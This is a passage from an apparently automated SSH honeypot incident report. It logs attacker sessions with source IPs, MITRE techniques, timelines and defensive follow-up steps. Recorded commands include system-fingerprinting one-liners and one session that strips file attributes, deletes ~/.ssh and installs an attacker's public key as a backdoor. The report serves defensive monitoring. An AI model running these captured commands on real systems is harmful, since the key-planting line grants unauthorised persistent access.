| `2026-08-15 05:42:31` | `cowrie.command.input` |
| `2026-08-15 05:42:31` | `cowrie.command.input` |
| `2026-08-15 05:42:31` | `cowrie.command.input` |
| `2026-08-15 05:42:31` | `cowrie.log.closed` |
| `2026-08-15 05:42:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d6b2a8dbab48

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-08-15 05:42 |
| **Last Seen** | 2026-08-15 05:42 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 05:42:28` | `cowrie.session.connect` |
| `2026-08-15 05:42:28` | `cowrie.client.version` |
| `2026-08-15 05:42:28` | `cowrie.client.kex` |
| `2026-08-15 05:42:29` | `cowrie.login.success` |
| `2026-08-15 05:42:30` | `cowrie.session.params` |
| `2026-08-15 05:42:30` | `cowrie.command.input` |
| `2026-08-15 05:42:30` | `cowrie.log.closed` |
| `2026-08-15 05:42:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-02e257173923

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-08-15 05:42 |
| **Last Seen** | 2026-08-15 05:42 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 05:42:33` | `cowrie.session.connect` |
| `2026-08-15 05:42:33` | `cowrie.client.version` |
| `2026-08-15 05:42:33` | `cowrie.client.kex` |
| `2026-08-15 05:42:34` | `cowrie.login.success` |
| `2026-08-15 05:42:35` | `cowrie.session.params` |
| `2026-08-15 05:42:35` | `cowrie.command.input` |
| `2026-08-15 05:42:35` | `cowrie.log.closed` |
| `2026-08-15 05:42:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0708b999bd78

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-08-15 05:42 |
| **Last Seen** | 2026-08-15 05:42 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 05:42:39` | `cowrie.session.connect` |
| `2026-08-15 05:42:39` | `cowrie.client.version` |
| `2026-08-15 05:42:39` | `cowrie.client.kex` |
| `2026-08-15 05:42:39` | `cowrie.login.success` |
| `2026-08-15 05:42:40` | `cowrie.session.params` |
| `2026-08-15 05:42:40` | `cowrie.command.input` |
| `2026-08-15 05:42:40` | `cowrie.log.closed` |
| `2026-08-15 05:42:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-114086fdda3c

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-08-15 05:42 |
| **Last Seen** | 2026-08-15 05:42 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 05:42:44` | `cowrie.session.connect` |
| `2026-08-15 05:42:44` | `cowrie.client.version` |
| `2026-08-15 05:42:44` | `cowrie.client.kex` |
| `2026-08-15 05:42:44` | `cowrie.login.success` |
| `2026-08-15 05:42:45` | `cowrie.session.params` |
| `2026-08-15 05:42:45` | `cowrie.command.input` |
| `2026-08-15 05:42:46` | `cowrie.log.closed` |
| `2026-08-15 05:42:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2c59bcf85041

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-08-15 05:42 |
| **Last Seen** | 2026-08-15 05:42 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 05:42:49` | `cowrie.session.connect` |
| `2026-08-15 05:42:49` | `cowrie.client.version` |
| `2026-08-15 05:42:49` | `cowrie.client.kex` |
| `2026-08-15 05:42:50` | `cowrie.login.success` |
| `2026-08-15 05:42:51` | `cowrie.session.params` |
| `2026-08-15 05:42:51` | `cowrie.command.input` |
| `2026-08-15 05:42:51` | `cowrie.log.closed` |
| `2026-08-15 05:42:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-67dddbca6991

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-08-15 05:42 |
| **Last Seen** | 2026-08-15 05:42 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 05:42:54` | `cowrie.session.connect` |
| `2026-08-15 05:42:54` | `cowrie.client.version` |
| `2026-08-15 05:42:54` | `cowrie.client.kex` |
| `2026-08-15 05:42:55` | `cowrie.login.success` |
| `2026-08-15 05:42:56` | `cowrie.session.params` |
| `2026-08-15 05:42:56` | `cowrie.command.input` |
| `2026-08-15 05:42:56` | `cowrie.log.closed` |
| `2026-08-15 05:42:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5ed91e477aeb

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-08-15 05:42 |
| **Last Seen** | 2026-08-15 05:43 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 05:42:59` | `cowrie.session.connect` |
| `2026-08-15 05:42:59` | `cowrie.client.version` |
| `2026-08-15 05:42:59` | `cowrie.client.kex` |
| `2026-08-15 05:43:00` | `cowrie.login.success` |
| `2026-08-15 05:43:01` | `cowrie.session.params` |
| `2026-08-15 05:43:01` | `cowrie.command.input` |
| `2026-08-15 05:43:01` | `cowrie.log.closed` |
| `2026-08-15 05:43:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4990bf4586a2

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-08-15 05:43 |
| **Last Seen** | 2026-08-15 05:43 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 05:43:05` | `cowrie.session.connect` |
| `2026-08-15 05:43:05` | `cowrie.client.version` |
| `2026-08-15 05:43:05` | `cowrie.client.kex` |
| `2026-08-15 05:43:05` | `cowrie.login.success` |
| `2026-08-15 05:43:06` | `cowrie.session.params` |
| `2026-08-15 05:43:06` | `cowrie.command.input` |
| `2026-08-15 05:43:06` | `cowrie.log.closed` |
| `2026-08-15 05:43:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1da236b4f43a

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-08-15 05:43 |
| **Last Seen** | 2026-08-15 05:43 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 05:43:10` | `cowrie.session.connect` |
| `2026-08-15 05:43:10` | `cowrie.client.version` |
| `2026-08-15 05:43:10` | `cowrie.client.kex` |
| `2026-08-15 05:43:11` | `cowrie.login.success` |
| `2026-08-15 05:43:11` | `cowrie.session.params` |
| `2026-08-15 05:43:11` | `cowrie.command.input` |
| `2026-08-15 05:43:12` | `cowrie.log.closed` |
| `2026-08-15 05:43:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6b6dd47c9de8

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-08-15 05:43 |
| **Last Seen** | 2026-08-15 05:43 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 05:43:15` | `cowrie.session.connect` |
| `2026-08-15 05:43:15` | `cowrie.client.version` |
| `2026-08-15 05:43:15` | `cowrie.client.kex` |
| `2026-08-15 05:43:16` | `cowrie.login.success` |
| `2026-08-15 05:43:17` | `cowrie.session.params` |
| `2026-08-15 05:43:17` | `cowrie.command.input` |
| `2026-08-15 05:43:17` | `cowrie.log.closed` |
| `2026-08-15 05:43:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-27e44076db31

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-08-15 05:43 |
| **Last Seen** | 2026-08-15 05:43 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 05:43:20` | `cowrie.session.connect` |
| `2026-08-15 05:43:20` | `cowrie.client.version` |
| `2026-08-15 05:43:20` | `cowrie.client.kex` |
| `2026-08-15 05:43:21` | `cowrie.login.success` |
| `2026-08-15 05:43:21` | `cowrie.session.params` |
| `2026-08-15 05:43:21` | `cowrie.command.input` |
| `2026-08-15 05:43:22` | `cowrie.log.closed` |
| `2026-08-15 05:43:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-301c19fc227d

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-08-15 05:44 |
| **Last Seen** | 2026-08-15 05:44 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 05:44:32` | `cowrie.session.connect` |
| `2026-08-15 05:44:32` | `cowrie.client.version` |
| `2026-08-15 05:44:32` | `cowrie.client.kex` |
| `2026-08-15 05:44:33` | `cowrie.login.success` |
| `2026-08-15 05:44:35` | `cowrie.session.params` |
| `2026-08-15 05:44:35` | `cowrie.command.input` |
| `2026-08-15 05:44:35` | `cowrie.command.input` |
| `2026-08-15 05:44:35` | `cowrie.command.input` |
| `2026-08-15 05:44:35` | `cowrie.command.input` |
| `2026-08-15 05:44:35` | `cowrie.command.input` |
| `2026-08-15 05:44:35` | `cowrie.command.success` |
| `2026-08-15 05:44:35` | `cowrie.command.input` |
| `2026-08-15 05:44:35` | `cowrie.command.input` |
| `2026-08-15 05:44:35` | `cowrie.command.input` |
| `2026-08-15 05:44:35` | `cowrie.command.input` |
| `2026-08-15 05:44:35` | `cowrie.log.closed` |
| `2026-08-15 05:44:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0ac65fb69f0d

| Field | Detail |
|---|---|
| **Source IP** | `69.6.234[.]27` |
| **First Seen** | 2026-08-15 05:45 |
| **Last Seen** | 2026-08-15 05:45 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 05:45:15` | `cowrie.session.connect` |
| `2026-08-15 05:45:15` | `cowrie.client.version` |
| `2026-08-15 05:45:15` | `cowrie.client.kex` |
| `2026-08-15 05:45:16` | `cowrie.login.success` |
| `2026-08-15 05:45:17` | `cowrie.session.params` |
| `2026-08-15 05:45:17` | `cowrie.command.input` |
| `2026-08-15 05:45:17` | `cowrie.command.failed` |
| `2026-08-15 05:45:17` | `cowrie.log.closed` |
| `2026-08-15 05:45:18` | `cowrie.session.params` |
| `2026-08-15 05:45:18` | `cowrie.command.input` |
| `2026-08-15 05:45:18` | `cowrie.session.file_download` |
| `2026-08-15 05:45:18` | `cowrie.log.closed` |
| `2026-08-15 05:45:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `69.6.234[.]27` to AbuseIPDB if not already reported
- [ ] Block `69.6.234[.]27` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b6cd217559c9

| Field | Detail |
|---|---|
| **Source IP** | `69.6.234[.]27` |
| **First Seen** | 2026-08-15 05:45 |
| **Last Seen** | 2026-08-15 05:45 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 05:45:18` | `cowrie.session.connect` |
| `2026-08-15 05:45:18` | `cowrie.client.version` |
| `2026-08-15 05:45:18` | `cowrie.client.kex` |
| `2026-08-15 05:45:18` | `cowrie.login.success` |
| `2026-08-15 05:45:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `69.6.234[.]27` to AbuseIPDB if not already reported
- [ ] Block `69.6.234[.]27` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f7c298407b6d

| Field | Detail |
|---|---|
| **Source IP** | `69.6.234[.]27` |
| **First Seen** | 2026-08-15 05:45 |
| **Last Seen** | 2026-08-15 05:45 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 05:45:18` | `cowrie.session.connect` |
| `2026-08-15 05:45:18` | `cowrie.client.version` |
| `2026-08-15 05:45:18` | `cowrie.client.kex` |
| `2026-08-15 05:45:19` | `cowrie.login.success` |
| `2026-08-15 05:45:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `69.6.234[.]27` to AbuseIPDB if not already reported
- [ ] Block `69.6.234[.]27` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-537dd3deaeb1

| Field | Detail |
|---|---|
| **Source IP** | `45.142.193[.]164` |
| **First Seen** | 2026-08-15 05:45 |
| **Last Seen** | 2026-08-15 05:46 |
| **Session Duration** | 45s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo xsec` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 05:45:47` | `cowrie.session.connect` |
| `2026-08-15 05:45:53` | `cowrie.client.version` |
| `2026-08-15 05:45:53` | `cowrie.client.kex` |
| `2026-08-15 05:46:15` | `cowrie.login.success` |
| `2026-08-15 05:46:28` | `cowrie.session.params` |
| `2026-08-15 05:46:28` | `cowrie.command.input` |
| `2026-08-15 05:46:33` | `cowrie.log.closed` |
| `2026-08-15 05:46:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.142.193[.]164` to AbuseIPDB if not already reported
- [ ] Block `45.142.193[.]164` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-da0c3df71a27

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-08-15 05:46 |
| **Last Seen** | 2026-08-15 05:46 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 05:46:38` | `cowrie.session.connect` |
| `2026-08-15 05:46:38` | `cowrie.client.version` |
| `2026-08-15 05:46:38` | `cowrie.client.kex` |
| `2026-08-15 05:46:39` | `cowrie.login.success` |
| `2026-08-15 05:46:41` | `cowrie.session.params` |
| `2026-08-15 05:46:41` | `cowrie.command.input` |
| `2026-08-15 05:46:41` | `cowrie.command.input` |
| `2026-08-15 05:46:41` | `cowrie.command.input` |
| `2026-08-15 05:46:41` | `cowrie.command.input` |
| `2026-08-15 05:46:41` | `cowrie.command.input` |
| `2026-08-15 05:46:41` | `cowrie.command.success` |
| `2026-08-15 05:46:41` | `cowrie.command.input` |
| `2026-08-15 05:46:41` | `cowrie.command.input` |
| `2026-08-15 05:46:41` | `cowrie.command.input` |
| `2026-08-15 05:46:41` | `cowrie.command.input` |
| `2026-08-15 05:46:41` | `cowrie.log.closed` |
| `2026-08-15 05:46:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3ab2b67e4f8e

| Field | Detail |
|---|---|
| **Source IP** | `217.165.22[.]192` |
| **First Seen** | 2026-08-15 05:47 |
| **Last Seen** | 2026-08-15 05:47 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 05:47:30` | `cowrie.session.connect` |
| `2026-08-15 05:47:30` | `cowrie.client.version` |
| `2026-08-15 05:47:30` | `cowrie.client.kex` |
| `2026-08-15 05:47:32` | `cowrie.login.success` |
| `2026-08-15 05:47:33` | `cowrie.session.params` |
| `2026-08-15 05:47:33` | `cowrie.command.input` |
| `2026-08-15 05:47:33` | `cowrie.log.closed` |
| `2026-08-15 05:47:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.165.22[.]192` to AbuseIPDB if not already reported
- [ ] Block `217.165.22[.]192` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bb3f21cf344c

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-08-15 05:48 |
| **Last Seen** | 2026-08-15 05:48 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 05:48:47` | `cowrie.session.connect` |
| `2026-08-15 05:48:48` | `cowrie.client.version` |
| `2026-08-15 05:48:48` | `cowrie.client.kex` |
| `2026-08-15 05:48:49` | `cowrie.login.success` |
| `2026-08-15 05:48:51` | `cowrie.session.params` |
| `2026-08-15 05:48:51` | `cowrie.command.input` |
| `2026-08-15 05:48:51` | `cowrie.command.input` |
| `2026-08-15 05:48:51` | `cowrie.command.input` |
| `2026-08-15 05:48:51` | `cowrie.command.input` |
| `2026-08-15 05:48:51` | `cowrie.command.input` |
| `2026-08-15 05:48:51` | `cowrie.command.success` |
| `2026-08-15 05:48:51` | `cowrie.command.input` |
| `2026-08-15 05:48:51` | `cowrie.command.input` |
| `2026-08-15 05:48:51` | `cowrie.command.input` |
| `2026-08-15 05:48:51` | `cowrie.command.input` |
| `2026-08-15 05:48:52` | `cowrie.log.closed` |
| `2026-08-15 05:48:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c4d4d3de8085

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-08-15 05:50 |
| **Last Seen** | 2026-08-15 05:50 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 05:50:52` | `cowrie.session.connect` |
| `2026-08-15 05:50:52` | `cowrie.client.version` |
| `2026-08-15 05:50:52` | `cowrie.client.kex` |
| `2026-08-15 05:50:54` | `cowrie.login.success` |
| `2026-08-15 05:50:56` | `cowrie.session.params` |
| `2026-08-15 05:50:56` | `cowrie.command.input` |
| `2026-08-15 05:50:56` | `cowrie.command.input` |
| `2026-08-15 05:50:56` | `cowrie.command.input` |
| `2026-08-15 05:50:56` | `cowrie.command.input` |
| `2026-08-15 05:50:56` | `cowrie.command.input` |
| `2026-08-15 05:50:56` | `cowrie.command.success` |
| `2026-08-15 05:50:56` | `cowrie.command.input` |
| `2026-08-15 05:50:56` | `cowrie.command.input` |
| `2026-08-15 05:50:56` | `cowrie.command.input` |
| `2026-08-15 05:50:56` | `cowrie.command.input` |
| `2026-08-15 05:50:57` | `cowrie.log.closed` |
| `2026-08-15 05:50:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
